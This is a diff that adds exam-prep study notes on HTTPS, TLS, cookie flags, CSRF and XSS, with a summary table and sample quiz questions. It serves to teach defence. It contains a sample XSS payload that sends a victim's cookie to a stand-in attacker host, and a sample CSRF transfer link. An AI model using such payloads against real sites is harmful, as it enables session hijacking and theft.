@@ -716,3 +716,130 @@ Which is a solution for SQL injection?
 What is OWASP?
 ➤ An organization that publishes web security best practices.
 
+✅ HTTPS
+
+✅ SSL/TLS
+
+✅ Cookies
+
+✅ CSRF
+
+✅ XSS
+
+These are frequent MCQ topics in bank SO exams (like Union Bank) and crucial for anyone working in Cybersecurity, Web, or Backend.
+
+🔒 1. HTTPS (HyperText Transfer Protocol Secure)
+Secure version of HTTP using SSL/TLS to encrypt communication between browser & server.
+
+🔐 What it does:
+Encrypts data (no one can read it)
+
+Authenticates the server (you know you're talking to the real website)
+
+🧠 Example:
+https://www.bank.com ensures login details can’t be read by attackers.
+
+📌 Key Points:
+Uses Port 443
+
+Shows a lock icon in the browser
+
+Prevents MITM (Man-in-the-Middle) attacks
+
+🔐 2. SSL/TLS (Secure Sockets Layer / Transport Layer Security)
+Protocols that encrypt data during transmission over the web.
+
+SSL is outdated.
+
+TLS is the modern, secure version.
+
+🔐 What TLS does:
+Encrypts communication
+
+Ensures data integrity
+
+Performs authentication
+
+Handshake Steps (Simplified):
+Browser says "Hi" → Server says "Hi" with its certificate
+
+Key exchange → Session key generated
+
+Encrypted communication begins
+
+🍪 3. Cookies
+Small pieces of data stored in the browser used for tracking and session management.
+
+📦 Used For:
+Login sessions (session_id)
+
+Remembering preferences (dark mode)
+
+Tracking users across websites (analytics/ads)
+
+🧠 Important Cookie Flags:
+Flag	Purpose
+HttpOnly	JS cannot access it (protects from XSS)
+Secure	Only sent over HTTPS
+SameSite	Prevents CSRF
+
+🛡️ 4. CSRF (Cross-Site Request Forgery)
+Tricks a logged-in user into performing unauthorized actions on a trusted site.
+
+🧠 Example:
+You're logged into your bank
+
+You click a malicious link:
+https://bank.com/transfer?amount=10000&to=attacker
+
+✅ Bank executes the action thinking it's you!
+
+🔐 Protection:
+Use CSRF tokens (random hidden values in forms)
+
+Use SameSite cookies
+
+Check Referer / Origin headers
+
+💥 5. XSS (Cross-Site Scripting)
+Attacker injects malicious JavaScript into a web page that runs on another user's browser.
+
+🧠 Example:
+<script>document.location='http://attacker.com?cookie='+document.cookie</script>
+
+🔐 Types:
+Stored XSS: Code saved in DB (e.g., comment box)
+
+Reflected XSS: Sent in URL, reflected in page
+
+DOM-based XSS: JS manipulates DOM insecurely
+
+🔐 Protection:
+Escape user input before rendering (HTML encoding)
+
+Use frameworks with auto-sanitization
+
+Set HttpOnly and Content-Security-Policy (CSP)
+
+🧠 Summary Table
+| Concept     | Description                    | Prevention                           |
+| ----------- | ------------------------------ | ------------------------------------ |
+| **HTTPS**   | Encrypted web communication    | Use SSL/TLS                          |
+| **SSL/TLS** | Protocol for secure connection | Use TLS 1.2+                         |
+| **Cookies** | Browser-stored session data    | Set Secure, HttpOnly, SameSite       |
+| **CSRF**    | Tricks user to perform actions | Use CSRF tokens, SameSite cookies    |
+| **XSS**     | Injects JS to steal data       | Input sanitization, HttpOnly cookies |
+
+
+🧠 Sample MCQs
+What protocol does HTTPS use to secure data?
+➤ TLS (or SSL)
+
+Which flag prevents JavaScript from accessing a cookie?
+➤ HttpOnly
+
+Which attack tricks users into unknowingly sending requests?
+➤ CSRF
+
+What is the solution to prevent XSS?
+➤ Input sanitization and encoding
